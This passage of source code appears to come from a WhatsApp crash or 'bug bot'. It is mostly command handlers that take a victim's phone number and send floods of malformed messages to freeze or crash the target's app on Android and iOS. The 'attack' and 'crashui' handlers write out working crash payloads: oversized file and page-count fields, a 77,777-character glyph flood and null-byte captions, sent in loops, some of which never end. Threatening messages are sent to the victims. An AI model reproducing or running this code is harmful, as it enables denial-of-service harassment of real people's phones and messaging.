          await deadline(target);
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
        }
        await sleep(1000);
        break;
        case 'jojo': case 'star':
        
        if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command}`);
        for (let i = 0; ; i++) {
          await deadline(target);
          await uilokas(target);
          await deadline(target);
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
        }
        await sleep(1000);
break

case 'fire': {

if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox2(from, jumlah)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
//no function bot
break
case 'attack':{

    if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
 if (!text) return m.reply(`*Format salah!*\nExample: ${prefix + command} <nomor target>`);

 const targetJid = text.includes('@s.whatsapp.net') ? text : `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const thumbnail = fs.readFileSync('./data/scar1.jpg'); 
 
 async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
 let etc = generateWAMessageFromContent(
 X,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 header: {
 title: "",
 documentMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
 mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
 fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
 fileLength: "9999999999999",
 pageCount: 9007199254740991,
 mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
 fileName: "⿻ CrazyCrash ⿻",
 fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1723855952",
 contactVcard: true,
 thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
 thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
 thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
 jpegThumbnail: ThM,
 },
 hasMediaAttachment: true,
 },
 body: {
 text: "⭑̤▾ ⿻ CrazyUi ⿻ ▾⭑" + "ꦾ" + "ꦾ".repeat(77777),
 },
 nativeFlowMessage: {
 messageParamsJson: '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
 },
 },
 },
 },
 }),
 {
 userJid: X,
 quoted: Qtd,
 }
 );

 await Dare.relayMessage(
 X,
 etc.message,
 ptcp
 ? {
 participant: {
 jid: X,
 },
 }
 : {}
 );
 console.log(chalk.green("𝗧𝗪 𝗖𝗜𝗟𝗟"));
 }

 // Function to send multiple messages
 async function sendMultipleMessages(targetJid, thumbnail, count = 5) {
 for (let i = 0; i < count; i++) {
 try {
 await ClPmNull(targetJid, m, thumbnail, false, true); // Send message
 console.log(`Pesan ke-${i + 1} berhasil dikirim!`);
 } catch (error) {
 console.log(`❌ Gagal mengirim pesan ke-${i + 1}: ${error.message}`);
 }
 }
 }

 // Call the function to send multiple messages (default 5 messages)
 try {
 await sendMultipleMessages(targetJid, thumbnail, 5); // Adjust count as needed
 m.reply(`Sukses Send Bug Ke : ${text}`);
 } catch (error) {
 m.reply(`❌ *Gagal mengirim pesan:* ${error.message}`);
 }
 }
 break
case 'crashui':{
    if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
 if (!text) return m.reply(`*Format salah!*\nExample: ${prefix + command} 234xxxxxxxxxx 1`);

 const args = text.split(' ');
 const targetJid = args[0].includes("@s.whatsapp.net") ? args[0] : `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const count = parseInt(args[1]) || 5; // Default 5 pesan jika jumlah tidak disebutkan

 async function sendViewOnceMessage(receiverJid) {
 try {
 const generatedMessage = generateWAMessageFromContent(
 receiverJid,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 liveLocationMessage: {
 degreesLatitude: Math.random() * 180 - 90, // Random latitude
 degreesLongitude: Math.random() * 360 - 180, // Random longitude
 caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ‌‌ 𝙏𝙍𝘼𝙎𝙃" + "\0".repeat(100), // Pesan error
 sequenceNumber: `${Math.floor(Math.random() * 1000)}`, // Random urutan
 jpegThumbnail: Buffer.from([]), // Thumbnail kosong
 }
 }
 }
 }),
 {
 userJid: receiverJid,
 }
 );

 await Dare.relayMessage(receiverJid, generatedMessage.message, {
 messageId: generatedMessage.key.id,
 });
 } catch (error) {
 console.error("❌ Gagal mengirim Bug:", error);
 }
 }

 async function sendMultipleMessages(receiverJid, count) {
 try {
 await Promise.all(
 Array.from({ length: count }).map(() => sendViewOnceMessage(receiverJid))
 );
 m.reply(`Sukses Send Bug ${args[0]}`);
 } catch (error) {
 m.reply(`❌ There is an error saat mengirim pesan: ${error.message}`);
 }
 }

 sendMultipleMessages(targetJid, count);
}
break
case 'hard-core': {

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'invasi-core': {

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'garri': {

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 35; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'easy-crash': {

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case '🔥': {

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 100; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'xcrash': {

if (!DareTheCreator) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await InfiNite(m.chat, cct = true, ppt = true)
await InfiNite(m.chat, cct = true, ppt = true)
await freezeui(m.chat, ptcp = true)
await freezeuii(m.chat, ptcp = true)
await Bug1(m.chat, Null)
await Bug2(m.chat, Null)
await Bug1(m.chat, Null)
await Bug2(m.chat, Null)
await Sinvi(target, Ptcp = true)
await InfiNite(target, cct = true, ptcp = true)
await systemUi(target, Ptcp = true)
await Jade(target, ptcp = true)
await bak2(target)
}
reply("TARGET CRASHED")
}
break
case 'attack-andro': {

if (!DareTheCreator) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await InfiNite(m.chat, cct = true, ppt = true)
await Bug2(m.chat, Null)
await Jade(target, ptcp = true)
await bak2(target)
await freezeui(m.chat, ptcp = true)
}
reply("TARGET CRASHED")
}
break
break
case 'ios-kill': case "ios-dead": case "war-ios": {

if (!DareTheCreator) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await virailix(target)
                    await viralix(target)
                    await XiosPay(target)
                    await XiosVirus(target)
                    await TxIos(target, Ptcp = true)
}
reply("TARGET CRASHED")
}
break                    
                    
case 'x-andro': {

if (!DareTheCreator) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
